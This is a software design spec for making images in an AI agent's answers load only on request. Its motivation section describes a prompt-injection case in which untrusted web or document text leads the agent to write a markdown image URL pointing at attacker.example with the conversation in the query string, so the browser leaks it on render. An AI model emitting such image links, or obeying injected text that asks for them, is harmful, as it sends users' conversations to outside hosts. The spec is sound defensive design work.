# Spec: Answer images load on request

| | |
|---|---|
| **ID** | 063-images-load-on-request |
| **Status** | done |
| **Author** | Reginaldo Silva |
| **Date** | 2026-10-15 |
| **Clarified** | 2026-10-15 — the owner delegated the open decisions to the assessment ("tome as decisões recomendadas") |

## Problem / motivation

Spec 044 renders an image URL in an answer as an `<img>`, and the browser fetches it the moment it
renders. The 2026-10-15 assessment named the consequence: the agent reads untrusted text — a web
page through `search_web`, a document through the Learn MCP — and a prompt injection in that text
can make it write `![](https://attacker.example/?q=<what the conversation said>)`. The browser then
sends the conversation to that host on render, with nobody pressing anything. `referrerpolicy` does
not help: the data travels in the URL itself.

The image is the only request in this app that does not go to the BFF (spec 044), which is what
makes it the exfiltration channel.

## Goals

- No request leaves the browser for an answer image until the reader asks for that image.
- Before that, the reader can see **where** the image would come from and what the answer says it
  shows, so the choice is an informed one.
- Once loaded, the image behaves as spec 044 made it behave (fitted, no referrer, opens larger).

## Non-goals

- A Content-Security-Policy `img-src` allow-list: it would block every image host the agent cites
  and repeal spec 044 wholesale.
- Remembered or trusted hosts, a "load all images" switch. Deferred — each is a preference with
  its own storage and its own way to be wrong.

## User-facing behavior

An image in an answer first appears as a compact placeholder: the host it would load from, its
description (or that it has none), and a **Load image** / **Carregar imagem** button. Pressing it
loads that one image in place.

## Acceptance criteria

1. **AC1** — Given an answer with an image URL, when it renders, then no `<img>` element exists for
   it (so the browser makes no request).
2. **AC2** — The placeholder names the image's host.
3. **AC3** — The placeholder shows the answer's description, or says there is none (spec 044 AC3).
4. **AC4** — The load control has an accessible name, in `en` and in `pt`.
5. **AC5** — When the control is pressed, the image renders with its `src`, `loading="lazy"` and
   `referrerpolicy="no-referrer"`, and opens larger on click as before (spec 044 AC4).
6. **AC6** — A URL the browser cannot parse renders no load control and no image, only the text.
7. **AC7** — A loaded image that fails still shows its URL (spec 044 AC6).

## Contract / data impact

None on the wire. One component; strings `image.load` and `image.from` in `en` + `pt`.
Spec 044 is superseded in part (its AC1/AC2 "renders an image" now happen on request).

## Open questions (clarify before planning)

- [x] CSP or click-to-load → click-to-load (non-goals above).

## Out of scope / deferred

- Trusted hosts and a global switch.
